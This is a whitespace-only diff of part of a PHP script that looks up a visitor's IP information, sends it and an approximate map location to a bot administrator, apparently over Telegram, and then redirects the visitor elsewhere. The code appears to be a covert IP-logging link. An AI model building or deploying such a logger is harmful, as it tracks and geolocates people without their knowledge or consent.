@@ -41,23 +41,23 @@ Url: $script_url
 $res = get_ip_info($ip);
 
 if ($res !== null){
-	$message .= "\n<b>Info ip:</b>\n";
-	foreach($res as $key => $value){  
-		$message .= $key.": ".$value."\n";  
-	}
+    $message .= "\n<b>Info ip:</b>\n";
+    foreach($res as $key => $value){  
+        $message .= $key.": ".$value."\n";  
+    }
 }
 
 $first_message = sendMessage($bot_admin_id, $message);
 
 if ($res !== null){
-	sendLocation(
-		$bot_admin_id, 
-		(float)$res['lat'], 
-		(float)$res['lon'],
+    sendLocation(
+        $bot_admin_id, 
+        (float)$res['lat'], 
+        (float)$res['lon'],
         null,
         false,
         (int)$first_message['result']['message_id']
-	);
+    );
 }
 
 header("Location: $website_redirection");
